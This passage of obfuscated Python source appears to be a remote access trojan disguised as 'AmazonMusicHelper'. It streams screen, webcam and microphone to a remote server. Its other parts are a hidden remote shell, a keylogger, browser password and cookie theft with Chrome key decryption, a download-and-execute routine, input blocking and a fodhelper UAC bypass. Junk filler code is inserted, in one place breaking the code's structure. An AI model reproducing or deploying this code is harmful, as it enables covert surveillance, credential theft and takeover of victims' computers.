                            if self.sc < 1.0: img = img.resize((int(img.width*self.sc), int(img.height*self.sc)), Image.LANCZOS)
                            buf = io.BytesIO(); img.save(buf, format=_D("_s26"), quality=self.q, optimize=True)
                            b64 = base64.b64encode(buf.getvalue()).decode()
                        else: b64 = base64.b64encode(ss.bgra).decode()
                        evt = _D("_s27")
                    else:
                        ret, frame = self.cap.read()
                        if not ret: time.sleep(0.5); continue
                        _, jpg = cv2.imencode(_D("_s28"), frame, [cv2.IMWRITE_JPEG_QUALITY, self.q])
                        b64 = base64.b64encode(jpg).decode()
                        evt = _D("_s29")
                    if self.sio and self.sio.connected:
                        self.sio.emit(evt, {_D("_s30"): b64, "format": "jpeg"})
                except Exception as e:
                    _l.error(f"{self.src} frame err: {e}")
                    time.sleep(0.1)
                    continue
                dt = time.time() - t0
                if dt < interval: time.sleep(interval - dt)
        except Exception as e:
            _l.error(f"{self.src} engine crash: {e}")
        finally: self.stop()
class MicEngine:
    ""_D("_s31")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.pa = None; self.stream = None
    def start(self):
        if self.r: return
        if not HAS[_D("_s32")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s33"), {"active": False, "error": "pyaudio not installed on target"})
            return
        try:
            self.pa = pyaudio.PyAudio()
            self.stream = self.pa.open(
                format=pyaudio.paInt16, channels=1, rate=16000,
                input=True, frames_per_buffer=4096)
        except Exception as e:
            _l.error(f"Mic init error: {e}"); self.stop()
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s34"), {"active": False, "error": str(e)})
            return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s35"), {"active": True})
    def stop(self):
        self.r = False
        if self.stream:
            try: self.stream.stop_stream(); self.stream.close()
            except: pass
            self.stream = None
        if self.pa:
            try: self.pa.terminate()
            except: pass
            self.pa = None
    @staticmethod
    def _make_wav(pcm_data):
        ""_D("_s36")""
        import struct
        data_len = len(pcm_data)
        header = struct.pack(_D("_s37"),
            b_D("_s38"), 36 + data_len, b'WAVE', b'fmt ', 16,
            1, 1, 16000, 32000, 2, 16,
            b_D("_s39"), data_len)
        return header + pcm_data
    def _loop(self):
        while self.r:
            try:
                data = self.stream.read(4096, exception_on_overflow=False)
                wav = self._make_wav(data)
                b64 = base64.b64encode(wav).decode()
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s40"), {"audio": b64})
            except Exception as e:
                _l.error(f"Mic err: {e}")
                time.sleep(0.1)
_ji = 0
for _ in [1,2,3]:
    if False: _ji += 1
class SysMon:
    def __init__(self, sio): self.r = False; self.sio = sio
    def start(self):
        if self.r or not HAS[_D("_s41")]: return
        self.r = True; threading.Thread(target=self._loop, daemon=True).start()
    def stop(self): self.r = False
    def _loop(self):
        while self.r:
            try:
                cpu = psutil.cpu_percent(interval=0.3); mem = psutil.virtual_memory()
                disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
                sens = {}
                try:
                    t = psutil.sensors_temperatures()
                    if t:
                        for n, e in t.items():
                            if e: sens[n] = e[0].current
                except: pass
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s42"), {"cpu_percent": cpu, "cpu_count": psutil.cpu_count(),
                        _D("_s43"): mem.percent, "memory_used_gb": round(mem.used/(1024**3),1),
                        _D("_s44"): round(mem.total/(1024**3),1), "disk_percent": disk.percent,
                        _D("_s45"): round(disk.free/(1024**3),1), "disk_total_gb": round(disk.total/(1024**3),1),
                        _D("_s46"): round(net.bytes_sent/(1024**2),1), "net_recv_mb": round(net.bytes_recv/(1024**2),1),
                        _D("_s47"): sens})
            except: pass
            time.sleep(2)
class Term:
    def __init__(self, sio): self.s = None; self.sio = sio
    def start(self):
        self.stop()
        sh = os.environ.get(_D("_s48"), "cmd.exe") if sys.platform == "win32" else os.environ.get("SHELL", "/bin/bash")
        try:
            if hasattr(os, _D("_s49")) and not (sys.platform == "win32" and "cmd" in sh.lower()):
                mf, sf = os.openpty()
                p = subprocess.Popen([sh], stdin=sf, stdout=sf, stderr=sf, cwd=os.getcwd(), close_fds=True,
                    preexec_fn=os.setsid if hasattr(os, _D("_s50")) else None,
                    env={**os.environ, _D("_s51"): "xterm-256color", "COLUMNS": "120", "LINES": "40"})
                os.close(sf); use_pty = True
            else:
                kw = {_D("_s52"): subprocess.PIPE, "stdout": subprocess.PIPE, "stderr": subprocess.STDOUT,
                      "cwd": os.getcwd(), _D("_s53"): True, "bufsize": 0, "universal_newlines": True}
                if sys.platform == _D("_s54"): kw["creationflags"] = subprocess.CREATE_NO_WINDOW
                p = subprocess.Popen([sh], **kw); mf = None; use_pty = False
            q = deque(maxlen=2000); stop = threading.Event()
            def rd():
                try:
                    if use_pty:
                        while not stop.is_set():
                            try:
                                d = os.read(mf, 4096)
                                if not d: break
                                q.append(d.decode(_D("_s55"), errors="replace"))
                            except (OSError, ValueError): break
                    else:
                        for ln in iter(p.stdout.readline, ""):
                            if stop.is_set(): break
                            q.append(ln)
                except: pass
                finally:
                    if use_pty and mf:
                        try: os.close(mf)
                        except: pass
            t = threading.Thread(target=rd, daemon=True); t.start()
            self.s = {"p": p, "rt": t, _D("_s56"): stop, "q": q, "mf": mf if use_pty else None, "pty": use_pty}
            def stream():
                while self.s and not stop.is_set():
                    out = []
                    while q: out.append(q.popleft())
                    if out and self.sio and self.sio.connected:
                        self.sio.emit(_D("_s57"), {"text": "".join(out)})
                    time.sleep(0.05)
            threading.Thread(target=stream, daemon=True).start()
            return True
        except Exception as e: _l.error(f"Term err: {e}"); return False
    def stop(self):
        if not self.s: return
        self.s[_D("_s58")].set()
        try:
            p = self.s["p"]
            if p.poll() is None:
                try:
                    if self.s.get("mf"): os.write(self.s["mf"], b"\x04")
                    else: p.stdin.write(_D("_s59")); p.stdin.flush()
                except: pass
                try: p.wait(timeout=3)
                except subprocess.TimeoutExpired: p.kill()
        except: pass
        finally:
            if self.s.get("mf"):
                try: os.close(self.s["mf"])
                except: pass
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
        self.s = None
    def write(self, cmd):
        if not self.s: return
        try:
            p = self.s["p"]
            if p.poll() is not None: self.start(); return
            if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
            else: p.stdin.write(cmd + "\n"); p.stdin.flush()
        except Exception as e: _l.error(f"Term write: {e}")
class Keylog:
    ""_D("_s60")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.buffer = []; self.listener = None
        self._last_window = ""
    def start(self):
        if self.r or not HAS[_D("_s61")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s62"), {"active": False, "error": "pynput not available"})
            return
        self.r = True; self.buffer = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        threading.Thread(target=self._flush_loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s63"), {"active": True})
    def stop(self):
        self.r = False; self._flush()  
        if self.listener:
            try: self.listener.stop()
            except: pass
            self.listener = None
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s64"), {"active": False})
    def _active_window(self):
        try:
            if sys.platform == _D("_s65"):
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""
    def _on_press(self, key):
        try:
            k = key.char if hasattr(key, _D("_s66")) and key.char else str(key)
            wnd = self._active_window()
            if wnd != self._last_window:
                self._last_window = wnd
                self.buffer.append({"k": f"[{wnd}]", "t": time.time()})
            self.buffer.append({"k": k, "t": time.time()})
        except: pass
    def _flush(self):
        if self.buffer and self.sio and self.sio.connected:
            self.sio.emit(_D("_s67"), {"keys": list(self.buffer), "window": self._last_window})
            self.buffer = []
    def _flush_loop(self):
        while self.r:
            time.sleep(3)
            self._flush()
def _proc(): return [{"pid": p.info["pid"], _D("_s68"): p.info["name"] or "?",
    "cpu": p.info[_D("_s69")] or 0, "memory": p.info["memory_percent"] or 0}
    for p in psutil.process_iter(["pid",_D("_s70"),"cpu_percent","memory_percent"])] if HAS["psutil"] else []
def _kill(pid):
    try: p = psutil.Process(int(pid)); p.terminate()
    except: return False, _D("_s71")
    try: p.wait(timeout=3)
    except psutil.TimeoutExpired: p.kill()
    return True, f"Killed {pid}"
def _audio():
    if not HAS[_D("_s72")]: return None
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume))
        return {_D("_s73"): round(v.GetMasterVolumeLevelScalar()*100), "muted": bool(v.GetMute())}
    except: return None
def _avol(lv):
    if not HAS[_D("_s74")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMasterVolumeLevelScalar(max(0, min(100, lv))/100.0, None); return True
    except: return False
def _amute():
    if not HAS[_D("_s75")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMute(not v.GetMute(), None); return True
    except: return False
def _monoff():
    try:
        if sys.platform == _D("_s76") and hasattr(ctypes, "windll"): ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else: subprocess.run([_D("_s77"),"dpms","force","off"], capture_output=True, timeout=5)
        return True
    except: return False
def _lock():
    try:
        if sys.platform == _D("_s78") and hasattr(ctypes, "windll"):
            r = ctypes.windll.user32.LockWorkStation()
            return True if r else False
        elif sys.platform == _D("_s79"):
            subprocess.run([_D("_s80"),"-suspend"], capture_output=True, timeout=5)
            return True
        else:
            for c in [[_D("_s81"),"lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
                try: subprocess.run(c, capture_output=True, timeout=5); return True
                except FileNotFoundError: continue
            return False
    except Exception as e: _l.error(f"Lock err: {e}"); return False
def _sleep():
    try:
        if sys.platform == _D("_s82") and hasattr(ctypes, "windll"):
            try:
                import win32security, win32api, pywintypes, win32con
                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
            except:
                pass  
            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
            return True
        elif sys.platform == _D("_s83"):
            subprocess.run([_D("_s84"),"sleepnow"], capture_output=True, timeout=5)
            return True
        else:
            subprocess.run([_D("_s85"),"suspend"], capture_output=True, timeout=5)
            return True
    except Exception as e: _l.error(f"Sleep err: {e}"); return False
def _wallpaper(path):
    ""_D("_s86")""
    is_url = path.startswith(_D("_s87")) or path.startswith("https://")
    if is_url:
        try:
            import urllib.request, tempfile
            fd, tmp = tempfile.mkstemp(suffix=_D("_s88"), prefix="wp_")
            os.close(fd)
            urllib.request.urlretrieve(path, tmp)
            path = tmp
        except Exception as e: return False, f"Download failed: {e}"
    if not os.path.exists(path): return False, _D("_s89")
    try:
        if sys.platform == _D("_s90"):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return True, _D("_s91")
        elif sys.platform == _D("_s92"):
            script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
            subprocess.run([_D("_s93"), "-e", script], capture_output=True)
            return True, _D("_s94")
        else:
            for cmd in [
                [_D("_s95"), "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                ["feh", _D("_s96"), path],
            ]:
                try: subprocess.run(cmd, capture_output=True, timeout=5); return True, _D("_s97")
                except: continue
            return False, _D("_s98")
    except Exception as e: return False, str(e)
def _msgbox(title, text):
    ""_D("_s99")""
    try:
        if sys.platform == _D("_s100"):
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)
        elif sys.platform == _D("_s101"):
            subprocess.run([_D("_s102"), "-e", f'display dialog "{text}" with title "{title}" buttons {{"OK"}}'], capture_output=True)
        else:
            subprocess.run([_D("_s103"), "--info", "--title", title, "--text", text], capture_output=True)
        return True, _D("_s104")
    except Exception as e: return False, str(e)
def _openurl(url):
    ""_D("_s105")""
    try:
        import webbrowser; webbrowser.open(url)
        return True, f"Opened {url}"
    except Exception as e: return False, str(e)
def _screenshot():
    ""_D("_s106")""
    if not HAS["mss"]: return None, _D("_s107")
    try:
        with mss.mss() as sct:
            ss = sct.grab(sct.monitors[1])
            if HAS["pil"]:
                img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s108"))
                buf = io.BytesIO(); img.save(buf, format="PNG")
                return base64.b64encode(buf.getvalue()).decode(), "png"
            return base64.b64encode(ss.bgra).decode(), "raw"
    except Exception as e: return None, str(e)
def _geoip():
    ""_D("_s109")""
    try:
        import urllib.request
        r = urllib.request.urlopen(_D("_s110"), timeout=5)
        return json.loads(r.read().decode())
    except Exception as e: return {_D("_s111"): str(e)}
def _apps():
    ""_D("_s112")""
    apps = []
    if sys.platform == _D("_s113"):
        for hk in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, hk)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = winreg.QueryValueEx(sk, _D("_s114"))[0]
                        if name: apps.append(name)
                        winreg.CloseKey(sk)
                    except: continue
                winreg.CloseKey(k)
            except: continue
    elif sys.platform == _D("_s115"):
        r = subprocess.run([_D("_s116"), "SPApplicationsDataType"], capture_output=True, text=True, timeout=10)
        apps = [l.strip() for l in r.stdout.split("\n") if l.strip() and not l.startswith(" ")]
    else:
        r = subprocess.run([_D("_s117"), "-l"], capture_output=True, text=True, timeout=10)
        apps = [l.split()[1] for l in r.stdout.split("\n")[5:] if l.strip()]
    return apps[:200]
def _play_sound(freq=800, dur=1):
    ""_D("_s118")""
    try:
        if sys.platform == _D("_s119"):
            import winsound; winsound.Beep(int(freq), int(dur*1000))
            return True, _D("_s120")
        else:
            subprocess.run([_D("_s121"), "/usr/share/sounds/freedesktop/stereo/bell.oga"], capture_output=True, timeout=3)
            return True, _D("_s122")
    except Exception as e: return False, str(e)
def _search_files(root, pattern, max_results=50, max_depth=5):
    ""_D("_s123")""
    results = []
    root_depth = root.rstrip(os.sep).count(os.sep)
    try:
        for dirpath, _, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root_depth
            if depth > max_depth: continue
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
                    if len(results) >= max_results: return results
            if len(results) >= max_results: break
    except: pass
    return results
def _execute_command(cmd):
    ""_D("_s124")""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired: return _D("_s125"), -1
    except Exception as e: return str(e), -1
def _block_input(block=True):
    ""_D("_s126")""
    if sys.platform != _D("_s127"): return False, "Windows only"
    try:
        ok = ctypes.windll.user32.BlockInput(block)
        if ok: return True, _D("_s128") if block else "Input unblocked"
        return False, _D("_s129") if block else "Unblock failed"
    except Exception as e: return False, str(e)
def _network_info():
    ""_D("_s130")""
    info = {_D("_s131"): [], "connections": [], "arp": []}
    try:
        if HAS[_D("_s132")]:
            for name, addrs in psutil.net_if_addrs().items():
                iface = {_D("_s133"): name, "addresses": []}
                for addr in addrs:
                    iface[_D("_s134")].append({
                        _D("_s135"): str(addr.family),
                        _D("_s136"): addr.address,
                        _D("_s137"): addr.netmask or "",
                        _D("_s138"): addr.broadcast or ""
                    })
                info[_D("_s139")].append(iface)
    except Exception as e: info[_D("_s140")] = str(e)
    try:
        if HAS[_D("_s141")]:
            for conn in psutil.net_connections(kind='all')[:100]:
                info[_D("_s142")].append({
                    "fd": conn.fd or -1,
                    _D("_s143"): str(conn.family),
                    _D("_s144"): str(conn.type),
                    _D("_s145"): f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                    _D("_s146"): f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    _D("_s147"): conn.status,
                    "pid": conn.pid or 0
                })
    except Exception as e: info[_D("_s148")] = str(e)
    try:
        if sys.platform == _D("_s149"):
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == _D("_s150") else 0)
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line and (_D("_s151") in line.lower() or "static" in line.lower()
                             or _D("_s152") in line.lower() or "statique" in line.lower()):
                    parts = line.split()
                    if len(parts) >= 2:
                        info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), _D("_s153"): parts[-1] if len(parts) > 2 else ""})
        else:
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.split("\n"):
                if "(" in line and ")" in line:
                    info["arp"].append(line.strip())
    except Exception as e: info[_D("_s154")] = str(e)
    return info
def _browser_steal():
    ""_D("_s155")""
    results = {_D("_s156"): {}, "edge": {}, "firefox": {}}
    localapp = os.environ.get(_D("_s157"), "")
    appdata = os.environ.get(_D("_s158"), "")
    chrome_path = os.path.join(localapp, _D("_s159"), "Chrome", "User Data")
    if os.path.exists(chrome_path):
        results[_D("_s160")] = _steal_chromium(chrome_path, "Chrome", localapp)
    else:
        results[_D("_s161")] = {"error": "Chrome not found"}
    edge_path = os.path.join(localapp, _D("_s162"), "Edge", "User Data")
    if os.path.exists(edge_path):
        results[_D("_s163")] = _steal_chromium(edge_path, "Edge", localapp)
    else:
        results[_D("_s164")] = {"error": "Edge not found"}
    firefox_path = os.path.join(appdata, _D("_s165"), "Firefox", "Profiles")
    if os.path.exists(firefox_path):
        results[_D("_s166")] = _steal_firefox(firefox_path)
    else:
        results[_D("_s167")] = {"error": "Firefox not found"}
    return results
def _steal_chromium(base_path, name, localapp):
    ""_D("_s168")""
    result = {_D("_s169"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            if not (item == _D("_s170") or item.startswith("Profile ")): continue
            profile_path = os.path.join(base_path, item)
            login_db = os.path.join(profile_path, _D("_s171"))
            if os.path.exists(login_db):
                temp_db = os.path.join(os.environ.get(_D("_s172"), "/tmp"), f"{name.lower()}_login_{item}.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s173"))
                        for row in cur.fetchall():
                            url, username, enc_pwd = row
                            pwd = _decrypt_chrome(enc_pwd) if (enc_pwd and HAS[_D("_s174")]) else "[needs cryptography]"
                            result[_D("_s175")].append({"url": url, "username": username, "password": pwd, "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception as e:
                    if not result.get(_D("_s176")): result["error"] = str(e)
                finally:
                    try: os.remove(temp_db)
                    except: pass
            for cookie_path in [os.path.join(profile_path, _D("_s177"), "Cookies"),
                                os.path.join(profile_path, _D("_s178"))]:
                if not os.path.exists(cookie_path): continue
                temp_db = os.path.join(os.environ.get(_D("_s179"), "/tmp"), f"{name.lower()}_cookies_{item}.db")
                try:
                    shutil.copy2(cookie_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s180"))
                        for row in cur.fetchall():
                            result[_D("_s181")].append({"host": row[0], "name": row[1], "value": "[encrypted]", "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
                break  
    except Exception as e:
        result[_D("_s182")] = str(e)
    return result
def _decrypt_chrome(encrypted_value):
    ""_D("_s183")""
    if not encrypted_value or not isinstance(encrypted_value, bytes):
        return _D("_s184")
    if len(encrypted_value) < 15 + 16:  
        return _D("_s185")
    if encrypted_value[:3] not in (b'v10', b'v20'):
        return _D("_s186") + encrypted_value[:3].decode(errors='replace') + "]"
    try:
        localapp = os.environ.get(_D("_s187"), "")
        browsers = [
            os.path.join(localapp, _D("_s188"), "Chrome", "User Data"),
            os.path.join(localapp, _D("_s189"), "Edge", "User Data"),
            os.path.join(localapp, _D("_s190"), "Brave-Browser", "User Data"),
            os.path.join(localapp, _D("_s191"), "Opera Stable"),
        ]
        for browser_path in browsers:
            ls_path = os.path.join(browser_path, _D("_s192"))
            if not os.path.exists(ls_path):
                continue
            try:
                with open(ls_path, 'r', encoding=_D("_s193")) as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state[_D("_s194")]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [(_D("_s196"), ctypes.wintypes.DWORD),
                                (_D("_s197"), ctypes.POINTER(ctypes.c_char))]
                pDataIn = DATA_BLOB(len(encrypted_key),
                    ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char)))
                pDataOut = DATA_BLOB()
                if not ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
                    continue
                aes_key = ctypes.create_string_buffer(pDataOut.cbData)
                ctypes.memmove(aes_key, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                aesgcm = AESGCM(bytes(aes_key))
                return aesgcm.decrypt(nonce, ciphertext, None).decode(_D("_s198"), errors='replace')
            except Exception:
                continue
    except Exception:
        pass
    return _D("_s199")
def _steal_firefox(base_path):
    ""_D("_s200")""
    result = {_D("_s201"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            profile_path = os.path.join(base_path, item)
            if not os.path.isdir(profile_path): continue
            logins_path = os.path.join(profile_path, _D("_s202"))
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding=_D("_s203")) as f:
                        logins = json.load(f)
                    for entry in logins.get(_D("_s204"), []):
                        result[_D("_s205")].append({
                            "url": entry.get(_D("_s206"), ""),
                            _D("_s207"): (entry.get("encryptedUsername", "") or "")[:80],
                            _D("_s208"): (entry.get("encryptedPassword", "") or "")[:80],
                            _D("_s209"): item,
                            _D("_s210"): True
                        })
                except Exception:
                    pass
            cookies_path = os.path.join(profile_path, _D("_s211"))
            if os.path.exists(cookies_path):
                temp_db = os.path.join(os.environ.get(_D("_s212"), "/tmp"), f"ff_cookies_{item}.db")
                try:
                    shutil.copy2(cookies_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s213"))
                        for row in cur.fetchall():
                            result[_D("_s214")].append({
                                _D("_s215"): row[0], "name": row[1],
                                _D("_s216"): (row[2] or "")[:80], "profile": item
                            })
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
    except Exception as e:
        result[_D("_s217")] = str(e)
    return result
def _download_exec(url, save_path=None):
    ""_D("_s218")""
    try:
        import urllib.request
        if not save_path:
            save_path = os.path.join(os.environ.get(_D("_s219"), "/tmp"), url.split("/")[-1] or "payload.exe")
        urllib.request.urlretrieve(url, save_path)
        if sys.platform == _D("_s220") and save_path.lower().endswith((".exe",".bat",".cmd",".ps1")):
            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif save_path.endswith(".sh") or not sys.platform.startswith("win"):
            os.chmod(save_path, 0o755)
            subprocess.Popen(save_path, shell=True)
        return True, f"Downloaded to {save_path}"
    except Exception as e: return False, str(e)
CFG = {"FR": None}
def _flist(path=""):
    if CFG.get("FR") and path and not str(Path(path).resolve()).startswith(str(Path(CFG["FR"]).resolve())): path = CFG["FR"]
    if not path and sys.platform == _D("_s221"):
        return {_D("_s222"): "Drives", "parent": None, "items": [
            {_D("_s223"): f"{chr(l)}:\\", "path": f"{chr(l)}:\\", "type": "drive", "size": 0, "modified": ""}
            for l in range(ord("A"), ord("Z")+1) if os.path.exists(f"{chr(l)}:\\")]}
    t = Path(path).resolve() if path else Path.home()
    if not t.exists(): return {_D("_s224"): "Not found"}
    if t.is_file(): return {_D("_s225"): "Not a dir"}
    items = []
    denied = False
    try:
        entries = list(t.iterdir())
    except PermissionError:
        denied = True
        entries = []
    except OSError:
        denied = True
        entries = []
    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
        try:
            s = e.stat(); items.append({_D("_s226"): e.name, "path": str(e.resolve()),
                _D("_s227"): "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
                _D("_s228"): datetime.fromtimestamp(s.st_mtime).isoformat()})
        except: items.append({_D("_s229"): e.name, "path": str(e.resolve()),
            _D("_s230"): "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
    parent = str(t.parent.resolve()) if t.parent != t else None
    result = {_D("_s231"): str(t.resolve()), "parent": parent, "items": items}
    if denied:
        result[_D("_s232")] = "Partial listing - some entries may be hidden due to permissions"
    return result
def _fdel(path):
    t = Path(path).resolve()
    if not t.exists(): return False, _D("_s233")
    try:
        if t.is_dir(): shutil.rmtree(t)
        else: t.unlink()
        return True, _D("_s234")
    except Exception as e: return False, str(e)
def _fmkdir(parent, name):
    try: Path(parent).resolve().joinpath(name).mkdir(parents=False, exist_ok=False); return True, "OK"
    except Exception as e: return False, str(e)
def _fread(path, offset=0, cs=1024*1024):
    try:
        with open(path, "rb") as f: f.seek(offset); d = f.read(cs)
        return {_D("_s235"): base64.b64encode(d).decode(), "offset": offset, "size": len(d), "eof": len(d) < cs}
    except Exception as e: return {_D("_s236"): str(e)}
def _fwrite(path, b64, offset=0, mode="wb"):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, mode) as f:
            if offset: f.seek(offset)
            f.write(base64.b64decode(b64))
        return True, "ok"
    except Exception as e: return False, str(e)
def _check_for_update(server_url):
    ""_D("_s237")""
    try:
        import urllib.request
        check_url = server_url.rstrip("/") + _D("_s238")
        r = urllib.request.urlopen(check_url, timeout=15)
        data = json.loads(r.read().decode())
        remote_ver = (data.get(_D("_s239")) or "").strip()
        download_url = (data.get(_D("_s240")) or "").strip()
        if not remote_ver or not download_url:
            _l.info(_D("_s241"))
            return None, None
        if remote_ver != _VERSION:
            _l.info(f"Update available: v{_VERSION} -> v{remote_ver}")
            return remote_ver, download_url
        else:
            _l.info(f"Client is up to date (v{_VERSION})")
            return None, None
    except Exception as e:
        _l.warning(f"Update check failed: {e}")
        return None, None
def _download_and_install(download_url, new_version):
    ""_D("_s242")""
    try:
        import urllib.request
        pd = _pdir()
        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
        _l.info(f"Downloading update from {download_url}...")
        urllib.request.urlretrieve(download_url, new_exe)
        _l.info(f"Downloaded to {new_exe}")
        current_exe = _exepath()
        bat_path = os.path.join(os.environ.get(_D("_s243"), pd), "rasphere_update.bat")
        with open(bat_path, "w") as f:
            f.write(f)
        _l.info(f"Update script written to {bat_path}")
        if sys.platform == _D("_s245"):
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            _l.info(_D("_s246"))
        else:
            _l.error(_D("_s247"))
            return False
        return True
    except Exception as e:
        _l.error(f"Update download/install failed: {e}")
        return False
def _is_admin():
    ""_D("_s248")""
    try:
        if sys.platform == _D("_s249"):
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass
    try:
        return os.getuid() == 0
    except:
        pass
    return False
def _fodhelper_uac_bypass(args):
    if sys.platform != _D("_s250"):
        _l.warning(_D("_s251"))
        return False
    try:
        import winreg as wr
    except ImportError:
        _l.error(_D("_s252"))
        return False
    exe_path = _exepath()
    elevated_args = []
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a in (_D("_s253"), "--no-elevate", "--uninstall", "--install"):
            i += 1
            continue
        if a in (_D("_s254"), "--secret", "--id", "--reconnect"):
            elevated_args.append(a)
            if i + 1 < len(sys.argv):
                elevated_args.append(sys.argv[i + 1])
                i += 1
        else:
            elevated_args.append(a)
        i += 1
    elevated_args.append(_D("_s255"))
    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
    _l.info(f"UAC bypass: relaunching as admin (fodhelper)")
    try:
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            wr.DeleteValue(key, _D("_s256"))
            wr.CloseKey(key)
        except:
            pass
        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
        wr.SetValueEx(key, _D("_s257"), 0, wr.REG_SZ, "")
        wr.CloseKey(key)
        try:
            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            wr.CloseKey(settings_key)
        except:
            pass
        fodhelper_path = os.path.join(os.environ.get(_D("_s258"), "C:\\Windows"), "System32", "fodhelper.exe")
        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
        _l.info(_D("_s259"))
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
